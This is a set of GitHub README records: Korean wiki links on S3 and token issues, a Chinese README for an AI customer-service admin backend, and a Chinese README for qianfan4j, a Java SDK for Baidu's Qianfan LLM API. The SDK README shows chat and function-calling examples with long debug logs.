[🔗 S3 Image삭제 시 Bucket에서 찾지 못하는 이슈](https://github.com/Just-Clover/YOUng-chat-backend/wiki/S3-Image-%EC%82%AD%EC%A0%9C-%EC%8B%9C-Bucket-%EC%97%90%EC%84%9C-%EC%B0%BE%EC%A7%80-%EB%AA%BB%ED%95%98%EB%8A%94-%EC%9D%B4%EC%8A%88)

[🔗 로그아웃 시 해당 사용자의 AccessToken 유효](https://github.com/Just-Clover/YOUng-chat-backend/wiki/%EB%A1%9C%EA%B7%B8%EC%95%84%EC%9B%83%EC%8B%9C-%ED%95%B4%EB%8B%B9-%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98-AccessToken-%EC%9C%A0%ED%9A%A8%EA%B8%B0%EA%B0%84-%EC%9D%B4%EC%8A%88)
",0,1,3,
aicyber2023/ai-customer-service-admin,master,"# 奥图智能客服管理后台

欢迎来到我的世界，我是奥图智能客服，基于奥图大模型开发的智能客服软件。我的核心功能是利用自然语言处理技术，理解和回答用户的问题，为用户提供及时、准确的帮助。
我可以通过学习“问答库”和“文档库”中的知识，为用户提供专业的服务。通过不断学习和改进，我能够越来越准确地理解用户的意图，提供个性化的服务。
现在，我希望能通过开放平台，让更多人了解和使用我。我坚信，在用户的反馈和参与下，我能不断优化和进步，更好地服务于大众。

# 在开放平台上，我将提供以下主要功能：

- 智能问答：通过自然语言处理技术，理解和回答用户的问题，提供及时、准确的帮助。

- 私有知识库：通过垂直领域知识的训练让客服更“聪明”。

- 用户反馈：收集和分析用户的反馈信息，不断优化和改进我的功能和服务。

- 数据分析：对用户问题和反馈数据进行深入分析，发现潜在问题，为进一步优化提供数据支持。

- 多渠道接入：支持多种渠道接入，包括网站、APP、微信等，方便用户随时随地进行咨询。

- 隐私保护：严格遵守相关法律法规和伦理规范，保护用户隐私和数据安全。

我承诺，在开放平台上，我会始终保持透明和开放的态度，与用户和开发者保持紧密的沟通和合作。同时，我也希望得到您的支持和鼓励。


在未来，我期待与更多的用户和开发者一起成长、进步。让我们共同创造一个更加智能、便捷的互联网环境！

# 联系我们
产品官网：www.aicyber.com/

合作邮箱：business@aicyber.com
",0,0,1,MIT
oldmanpushcart/qianfan4j,main,"# qianfan4j：千帆 Java SDK
![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)
![JDK17+](https://img.shields.io/badge/JDK-17+-blue.svg)
![LLM-文心一言](https://img.shields.io/badge/LLM-%E6%96%87%E5%BF%83%E4%B8%80%E8%A8%80-blue.svg)

`qianfan4j`是一个开源的千帆大模型平台的非官方Java客户端，基于`JDK17`构建。它旨在提供一个功能丰富、易于集成和使用的Java库，以便开发者能够通过千帆API轻松实现对话、续写、向量嵌入和图像处理等功能。

> 请注意：在使用`qianfan4j`时，你需要遵守千帆API的使用条款和条件。

## 一、主要功能

`qianfan4j`支持以下千帆API功能：

- **对话（Chat）**
    - 提供用户与千帆模型进行自然语言对话。
    - 支持用户在一次对话中触发多个函数调用。

- **续写（Completions）**
    - 提供文本续写功能，可以根据给定的文本片段生成后续内容。

- **向量（Embeddings）**
    - 将文本转换为向量表示，用于文本相似度比较、聚类等任务。

- **图像（Images）**
    - **图生文：** 根据提供的图像生成描述性文本。
    - **文生图：** 将文本描述转换为相应的图像。

- **插件应用（Plugin）**
    - **知识库：** 让开发者（甚至非技术人员）以简单的方式管理数据集，包括分片、清洗、向量计算等能力。
    - **智慧图问：** 图片理解识别，并对图片内容进行总结概述，输出用户可理解的句子或段落。
    - **百度搜索：** 百度搜索插件,实时获取新闻、股票信息等
    - **网页解析：** 从任何网页链接获取所需文本信息
    - **天气查询：** 输入地址，给出当前该地址天气；输入地址+时间，给出该地址时间段内的天气

## 二、系统要求

1. **JDK17**或更高版本

## 三、跑通测试

1. 到[百度智能云](https://cloud.baidu.com/)上注册一个账号
2. 在百度智能云上[创建一个应用](https://console.bce.baidu.com/qianfan/ais/console/applicationConsole/application)，你将会得到一个API Key和一个Secret Key
3. 声明环境变量：
   ```shell
   export QIANFAN_AK=<YOUR APP-KEY>
   export QIANFAN_SK=<YOUR SECRET-KEY>
   ```
   注意：[PluginAppTestCase](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/pluginapp/PluginAppTestCase.java)
   测试用例如果要跑通，需要在千帆大模型平台创建插件应用，开通`ocr-chat`插件。 并在配置文件中追加一行
   ```shell
   export QIANFAN_PLUGIN_APP_ID=<YOUR PLUGIN-APP ID>
   ```
4. 运行测试用例：`mvn test`

## 四、依赖使用

项目仓库托管在Maven中央仓库，你可以在`pom.xml`中添加以下依赖：
```xml
<dependency>
    <groupId>io.github.oldmanpushcart</groupId>
    <artifactId>qianfan4j</artifactId>
    <version>1.0.0</version>
</dependency>
```

### 创建客户端

```java
// 线程池
final var executor = Executors.newFixedThreadPool(10);

// 千帆客户端
final var client = QianFanClient.newBuilder()
    .ak(""***"") // API Key
    .sk(""***"") // Secret Key
    .executor(executor)
    .connectTimeout(Duration.ofSeconds(30))
    .build();
```

### 对话示例

```java
// 对话请求
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .messages(Message.ofUser(""hello!""))
    .build();

// 对话响应
final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response);
```

输出结果

```text
2024-03-10 17:53:43 DEBUG qianfan://token/refresh success! expired=1712656423872;
2024-03-10 17:53:43 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""hello!""}]}
2024-03-10 17:53:45 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-7sntu8vk0p"",""object"":""chat.completion"",""created"":1710064425,""result"":""你好！很高兴与你交流。有什么我可以帮助你的吗？请随时告诉我。"",""is_truncated"":false,""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":2,""completion_tokens"":16,""total_tokens"":18}}
你好！很高兴与你交流。有什么我可以帮助你的吗？请随时告诉我。
```

### 函数调用示例

在`qianfan4j`中进行函数的声明将会变成一个非常简单的事情。框架自动帮你完成了函数的声明和参数的解析。这样，你就可以专注于函数的实现，而不用再去关心函数的声明和参数的解析了。

函数声明

```java
@ChatFn(name = ""echo"", description = ""echo words"", examples = {
    @ChatFn.Example(
        question = ""echo: words"",
        thoughts = ""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息"",
        arguments = """"""
            {
                ""words"": ""hello, world""
            }
            """"""
    )
})
public class EchoFunction implements ChatFunction<EchoFunction.Echo, EchoFunction.Echo> {

    @Override
    public CompletableFuture<Echo> call(Echo echo) {
        return CompletableFuture.completedFuture(new Echo(echo.words()));
    }

    public record Echo(String words) {

    }

}
```

对话触发函数调用

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new EchoFunction())
    .messages(Message.ofUser(""echo: HELLO WORLD!""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

输出结果

```text
2024-03-10 17:58:37 DEBUG qianfan://token/refresh success! expired=1712656717750;
2024-03-10 17:58:37 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""echo: HELLO WORLD!""}],""functions"":[{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]}]}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-aqte3cvapb"",""object"":""chat.completion"",""created"":1710064720,""result"":"""",""is_truncated"":false,""need_clear_history"":false,""function_call"":{""name"":""echo"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息"",""arguments"":""{\""words\"":\""HELLO WORLD!\""}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":112,""completion_tokens"":24,""total_tokens"":136}}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0/function <= {""words"":""HELLO WORLD!""}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0/function => {""words"":""HELLO WORLD!""}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""echo: HELLO WORLD!""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\""words\"":\""HELLO WORLD!\""}"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}},{""role"":""function"",""content"":""{\""words\"":\""HELLO WORLD!\""}"",""name"":""echo""}],""functions"":[{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]},{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""当用户输入echo:开头的消息时，机器人会原样返回用户输入的消息""}}]]}]}
2024-03-10 17:58:42 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-tj5rhmj89g"",""object"":""chat.completion"",""created"":1710064722,""result"":""您好，您输入的消息是：HELLO WORLD!，我已原样返回。请问有其他需要吗？"",""is_truncated"":false,""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":225,""completion_tokens"":21,""total_tokens"":246}}
您好，您输入的消息是：HELLO WORLD!，我已原样返回。请问有其他需要吗？
```

### 多函数调用示例

`qianfan4j`会根据LLM的推理能力，自动拆解多函数调用的任务，然后按照拆解的任务顺序依次调用函数。这样，你就可以专注于函数的实现，而不用再去关心函数的调用顺序了。
我们假设有两个函数 [QueryScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/QueryScoreFunction.java)和 [ComputeAvgScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/ComputeAvgScoreFunction.java)，分别用于查询成绩和计算平均分。我们可以通过以下方式实现多函数调用：

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new QueryScoreFunction(), new ComputeAvgScoreFunction())
    .option(ChatOptions.IS_STREAM, true)
    .option(ChatOptions.IS_ENABLE_SEARCH, false)
    .option(ChatOptions.TEMPERATURE, 0.01f)
    .messages(Message.ofUser(""计算李四的语文和数学平均分""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

输出结果

```text
2024-03-10 18:02:44 DEBUG qianfan://token/refresh success! expired=1712656964044;
2024-03-10 18:02:44 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""}],""functions"":[{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gmjf3vyemg"",""object"":""chat.completion"",""created"":1710064967,""sentence_id"":0,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""function_call"":{""name"":""query_score"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":676,""completion_tokens"":92,""total_tokens"":768}}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0/function <= {""name"":""李四"",""subjects"":[""CHINESE"",""MATH""]}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0/function => {""message"":""查询成功"",""data"":[{""name"":""李四"",""subject"":""CHINESE"",""value"":80.0},{""name"":""李四"",""subject"":""MATH"",""value"":70.0}],""success"":true}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""}],""functions"":[{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]},{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""张三\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""查询张三、李四的数学成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""张三\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""用户需要查询张三、李四、王五的数学成绩，但函数一次只能查询一个学生，所以我们先查询张三的成绩，然后再分别查询李四和王五的数学成绩""}}],[{""role"":""user"",""content"":""查询李四的数学和语文成绩""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""李四\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""用户需要查询李四的数学和语文成绩，函数一次可以查询一个学生的多个成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:48 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064968,""sentence_id"":0,""is_end"":false,""is_truncated"":false,""result"":""李四"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:49 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064969,""sentence_id"":1,""is_end"":false,""is_truncated"":false,""result"":""的语文成绩是80分，数学成绩是70分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:49 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064970,""sentence_id"":2,""is_end"":false,""is_truncated"":false,""result"":""他的平均分是75分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064971,""sentence_id"":3,""is_end"":false,""is_truncated"":false,""result"":""如果您需要更详细的信息或有其他问题，请随时告诉我。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064971,""sentence_id"":4,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":36,""total_tokens"":848}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""},{""role"":""assistant"",""content"":""李四的语文成绩是80分，数学成绩是70分。他的平均分是75分。如果您需要更详细的信息或有其他问题，请随时告诉我。""},{""role"":""user"",""content"":"" 使用[compute_avg_score]工具计算平均分""}],""functions"":[{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-y42i2td7tk"",""object"":""chat.completion"",""created"":1710064973,""sentence_id"":0,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""function_call"":{""name"":""compute_avg_score"",""thoughts"":""我需要调用[compute_avg_score]工具来计算李四的平均分。"",""arguments"":""{\""scores\"":[80,70]}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":680,""completion_tokens"":30,""total_tokens"":710}}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0/function <= {""scores"":[80,70]}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0/function => {""avg_score"":75.0}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""计算李四的语文和数学平均分""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""李四\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""我需要先查询李四的语文和数学成绩，然后计算平均分。任务拆解：[sub-task1: 使用[query_score]工具查询李四的语文和数学成绩，sub-task2: 使用[compute_avg_score]工具计算平均分]。接下来需要调用[query_score]工具来查询李四的语文和数学成绩。""}},{""role"":""function"",""content"":""{\""message\"":\""查询成功\"",\""data\"":[{\""name\"":\""李四\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""李四\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""},{""role"":""assistant"",""content"":""李四的语文成绩是80分，数学成绩是70分。他的平均分是75分。如果您需要更详细的信息或有其他问题，请随时告诉我。""},{""role"":""user"",""content"":"" 使用[compute_avg_score]工具计算平均分""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\""scores\"":[80,70]}"",""thoughts"":""我需要调用[compute_avg_score]工具来计算李四的平均分。""}},{""role"":""function"",""content"":""{\""avg_score\"":75.0}"",""name"":""compute_avg_score""}],""functions"":[{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]},{""name"":""compute_avg_score"",""description"":""计算平均成绩"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""分数集合"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""平均分""}}},""examples"":[[{""role"":""user"",""content"":""张三的语文30分、数学20分、英语100分；\n李四的语文50分、数学90分、英语60分；\n计算张三的平均成绩\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""我应该将张三的所有分数传入，计算张三的平均分""}}],[{""role"":""user"",""content"":""张三的数学成绩是50分、语文30分、英语20分；李四的数学成绩是60分、语文90分；请计算他们的语文平均成绩""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""我应该把所有人的语文分数传入，从而计算出语文的平均成绩""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064974,""sentence_id"":0,""is_end"":false,""is_truncated"":false,""result"":""根据您的要求"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":0,""total_tokens"":689}}
2024-03-10 18:02:55 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064975,""sentence_id"":1,""is_end"":false,""is_truncated"":false,""result"":""，我已经使用[compute_avg_score]工具计算了李四的平均分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":0,""total_tokens"":689}}
2024-03-10 18:02:55 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gtbgh1agd9"",""object"":""chat.completion"",""created"":1710064976,""sentence_id"":2,""is_end"":false,""is_truncated"":false,""result"":""他的平均分是75.0分。"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":689,""completion_tokens"":29,""total_tokens"":718}}
